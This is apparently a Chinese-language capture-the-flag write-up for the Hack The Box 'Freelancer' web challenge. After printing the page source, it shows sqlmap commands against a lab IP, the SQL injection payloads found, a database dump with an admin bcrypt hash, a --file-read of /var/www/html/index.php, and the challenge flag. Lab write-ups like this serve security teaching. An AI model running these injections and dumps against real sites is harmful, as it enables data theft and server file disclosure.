# FreeLancer

Can you test how secure my website is? Prove me wrong and capture the flag!

### Solution
* 在他的 source code 裡面有一個有趣的註解
    ```html=
    <!DOCTYPE html>
    <html lang="en">
       <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
          <meta name="description" content="Freelancer">
          <meta name="author" content="IhsanSencan">
          <title>Freelancer</title>
          <!-- Custom fonts for this theme --> 
          <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
          <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
          <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">
          <!-- Theme CSS --> 
          <link href="css/freelancer.min.css" rel="stylesheet">
          <link rel="icon" href="favicon.ico" type="image/x-icon">
       </head>
       <body id="page-top">
          <!-- Navigation --> 
          <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
             <div class="container">
                <a class="navbar-brand js-scroll-trigger" href="#page-top">Freelancer</a> <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"> Menu <i class="fas fa-bars"></i> </button> 
                <div class="collapse navbar-collapse" id="navbarResponsive">
                   <ul class="navbar-nav ml-auto">
                      <li class="nav-item mx-0 mx-lg-1"> <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#portfolio">Portfolio</a> </li>
                      <li class="nav-item mx-0 mx-lg-1"> <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#about">About</a> </li>
                      <li class="nav-item mx-0 mx-lg-1"> <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#contact">Contact</a> </li>
                   </ul>
                </div>
             </div>
          </nav>
          <!-- Masthead --> 
          <header class="masthead bg-primary text-white text-center">
             <div class="container d-flex align-items-center flex-column">
                <!-- Masthead Avatar Image --> <img class="masthead-avatar mb-5" src="img/avataaars.svg" alt=""> <!-- Masthead Heading --> 
                <h1 class="masthead-heading text-uppercase mb-0">Freelancer</h1>
                <!-- Icon Divider --> 
                <div class="divider-custom divider-light">
                   <div class="divider-custom-line"></div>
                   <div class="divider-custom-icon"> <i class="fas fa-star"></i> </div>
                   <div class="divider-custom-line"></div>
                </div>
                <!-- Masthead Subheading --> 
                <p class="masthead-subheading font-weight-light mb-0">Graphic Artist - Web Designer - Illustrator</p>
             </div>
          </header>
          <!-- Portfolio Section --> 
          <section class="page-section portfolio" id="portfolio">
             <div class="container">
                <!-- Portfolio Section Heading --> 
                <h2 class="page-section-heading text-center text-uppercase text-secondary mb-0">Portfolio</h2>
                <!-- Icon Divider --> 
                <div class="divider-custom">
                   <div class="divider-custom-line"></div>
                   <div class="divider-custom-icon"> <i class="fas fa-star"></i> </div>
                   <div class="divider-custom-line"></div>
                </div>
                <!-- Portfolio Grid Items --> 
                <div class="row">
                   <!-- Portfolio Item 1 --> 
                   <div class="col-md-6 col-lg-4">
                      <div data-target="#">
                         <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
                            <div class="portfolio-item-caption-content text-center text-white"> <i class="fas fa-plus fa-3x"></i> </div>
                         </div>
                         <img class="img-fluid" src="img/portfolio/cabin.png" alt=""> <!-- <a href="portfolio.php?id=1">Portfolio 1</a> --> 
                      </div>
                   </div>
                   <!-- Portfolio Item 2 --> 
                   <div class="col-md-6 col-lg-4">
                      <div data-target="#">
                         <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
                            <div class="portfolio-item-caption-content text-center text-white"> <i class="fas fa-plus fa-3x"></i> </div>
                         </div>
                         <img class="img-fluid" src="img/portfolio/cake.png" alt=""> <!-- <a href="portfolio.php?id=2">Portfolio 2</a> --> 
                      </div>
                   </div>
                   <!-- Portfolio Item 3 --> 
                   <div class="col-md-6 col-lg-4">
                      <div data-target="#">
                         <div class="portfolio-item-caption d-flex align-items-center justify-content-center h-100 w-100">
                            <div class="portfolio-item-caption-content text-center text-white"> <i class="fas fa-plus fa-3x"></i> </div>
                         </div>
                         <img class="img-fluid" src="img/portfolio/circus.png" alt=""> <!-- <a href="portfolio.php?id=3">Portfolio 3</a> --> 
                      </div>
                   </div>
                </div>
                <!-- /.row --> 
             </div>
          </section>
          <!-- About Section --> 
          <section class="page-section bg-primary text-white mb-0" id="about">
             <div class="container">
                <!-- About Section Heading --> 
                <h2 class="page-section-heading text-center text-uppercase text-white">About</h2>
                <!-- Icon Divider --> 
                <div class="divider-custom divider-light">
                   <div class="divider-custom-line"></div>
                   <div class="divider-custom-icon"> <i class="fas fa-star"></i> </div>
                   <div class="divider-custom-line"></div>
                </div>
                <!-- About Section Content --> 
                <div class="row">
                   <div class="col-lg-4 ml-auto">
                      <p class="lead">Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text...</p>
                   </div>
                   <div class="col-lg-4 mr-auto">
                      <p class="lead">It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout...</p>
                   </div>
                </div>
             </div>
          </section>
          <!-- Contact Section --> 
          <section class="page-section" id="contact">
             <div class="container">
                <!-- Contact Section Heading --> 
                <h2 class="page-section-heading text-center text-uppercase text-secondary mb-0">Contact Me</h2>
                <!-- Icon Divider --> 
                <div class="divider-custom">
                   <div class="divider-custom-line"></div>
                   <div class="divider-custom-icon"> <i class="fas fa-star"></i> </div>
                   <div class="divider-custom-line"></div>
                </div>
                <!-- Contact Section Form --> 
                <div class="row">
                   <div class="col-lg-8 mx-auto">
                      <!-- To configure the contact form email address, go to mail/contact_me.php and update the email address in the PHP file on line 19. --> 
                      <form name="sentMessage" id="contactForm" novalidate="novalidate">
                         <div class="control-group">
                            <div class="form-group floating-label-form-group controls mb-0 pb-2">
                               <label>Name</label> <input class="form-control" id="name" type="text" placeholder="Name" required="required" data-validation-required-message="Please enter your name."> 
                               <p class="help-block text-danger"></p>
                            </div>
                         </div>
                         <div class="control-group">
                            <div class="form-group floating-label-form-group controls mb-0 pb-2">
                               <label>Email Address</label> <input class="form-control" id="email" type="email" placeholder="Email Address" required="required" data-validation-required-message="Please enter your email address."> 
                               <p class="help-block text-danger"></p>
                            </div>
                         </div>
                         <div class="control-group">
                            <div class="form-group floating-label-form-group controls mb-0 pb-2">
                               <label>Phone Number</label> <input class="form-control" id="phone" type="tel" placeholder="Phone Number" required="required" data-validation-required-message="Please enter your phone number."> 
                               <p class="help-block text-danger"></p>
                            </div>
                         </div>
                         <div class="control-group">
                            <div class="form-group floating-label-form-group controls mb-0 pb-2">
                               <label>Message</label> 
                               <textarea class="form-control" id="message" rows="5" placeholder="Message" required="required" data-validation-required-message="Please enter a message."></textarea>
                               <p class="help-block text-danger"></p>
                            </div>
                         </div>
                         <br> 
                         <div id="success"></div>
                         <div class="form-group"> <button type="submit" class="btn btn-primary btn-xl" id="sendMessageButton">Send</button> </div>
                      </form>
                   </div>
                </div>
             </div>
          </section>
          <!-- Footer --> 
          <footer class="footer text-center">
             <div class="container">
                <div class="row">
                   <!-- Footer Location --> 
                   <div class="col-lg-4 mb-5 mb-lg-0">
                      <h4 class="text-uppercase mb-4">Location</h4>
                      <p class="lead mb-0">2215 John Daniel Drive <br>Clark, MO 65243</p>
                   </div>
                   <!-- Footer Social Icons --> 
                   <div class="col-lg-4 mb-5 mb-lg-0">
                      <h4 class="text-uppercase mb-4">Around the Web</h4>
                      <a class="btn btn-outline-light btn-social mx-1" href="#"> <i class="fab fa-fw fa-facebook-f"></i> </a> <a class="btn btn-outline-light btn-social mx-1" href="#"> <i class="fab fa-fw fa-twitter"></i> </a> <a class="btn btn-outline-light btn-social mx-1" href="#"> <i class="fab fa-fw fa-linkedin-in"></i> </a> <a class="btn btn-outline-light btn-social mx-1" href="#"> <i class="fab fa-fw fa-dribbble"></i> </a> 
                   </div>
                   <!-- Footer About Text --> 
                   <div class="col-lg-4">
                      <h4 class="text-uppercase mb-4">About Freelancer</h4>
                      <p class="lead mb-0">"Neque porro quisquam est qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit..." </p>
                   </div>
                </div>
             </div>
          </footer>
          <!-- Copyright Section --> 
          <section class="copyright py-4 text-center text-white">
             <div class="container">
                <small>
                   Copyright &copy; Freelance 2019 <br>
                   <a href="https://www.hackthebox.eu/home/users/profile/100992">
                      <p>Ihsan Sencan</p>
                   </a>
                </small>
             </div>
          </section>
          <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes) --> 
          <div class="scroll-to-top d-lg-none position-fixed "> <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top"> <i class="fa fa-chevron-up"></i> </a> </div>
          <!-- Bootstrap core JavaScript --> <script src="vendor/jquery/jquery.min.js"></script> <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script> <!-- Plugin JavaScript --> <script src="vendor/jquery-easing/jquery.easing.min.js"></script> <!-- Contact Form JavaScript --> <script src="js/jqBootstrapValidation.js"></script> <script src="js/contact_me.js"></script> <!-- Custom scripts for this template --> <script src="js/freelancer.min.js"></script>
       </body>
    </html>
    ```
    ```html=
    <!-- <a href="portfolio.php?id=1">Portfolio 1</a> --> 
    ```
* 直接訪問 http://178.62.0.100:31310/portfolio.php?id=1
* 稍微測試一下 id 是 sql injection 的注入點
    ```bash=
    // 直接進行注入
    sqlmap http://178.62.0.100:31310/portfolio.php?id=1 --level 5 --risk 3 --batch
    ```
    ```bash=
    ---
    Parameter: id (GET)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: id=1 AND 1686=1686

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: id=1 AND (SELECT 1876 FROM (SELECT(SLEEP(5)))GpFz)

        Type: UNION query
        Title: Generic UNION query (NULL) - 3 columns
        Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7171717671,0x774c6961536c576154716b7174535341766268436370537765595048616d7666777a63504948694c,0x7170707871),NULL-- -
    ---
    ```
    ```bash=
    // 查看 database
    sqlmap http://178.62.0.100:31310/portfolio.php?id=1 --dbs
    ```
    ```bash=
    // 查看指定 database 的 tables
    sqlmap http://178.62.0.100:31310/portfolio.php?id=1 -D freelancer --tables
    ```
    ```bash=
    // dump 出指定的 database
    sqlmap http://178.62.0.100:31310/portfolio.php?id=1 -D freelancer --dump
    ```
    ```bash=
    +----+--------------------------------------------------------------+----------+---------------------+
    | id | password                                                     | username | created_at          |
    +----+--------------------------------------------------------------+----------+---------------------+
    | 1  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | safeadm  | 2019-07-16 20:25:45 |
    +----+--------------------------------------------------------------+----------+---------------------+
    ```
    * 這個 password 是不能被破解的
* 進而我們直接讀取 file 拿到 source code 
* 一般在 apache server 中 file 預設是在 /var/www/html 下
    ```bash=
    // 拿到 index.php
    sqlmap http://178.62.0.100:31310/portfolio.php?id=1 --file-read="/var/www/html/index.php" --batch
    ```
* 把所有的 file 都 dump 下來之後，就可以拿到 flag 了
* flag : `HTB{s4ff_3_1_w33b_fr4__l33nc_3}`
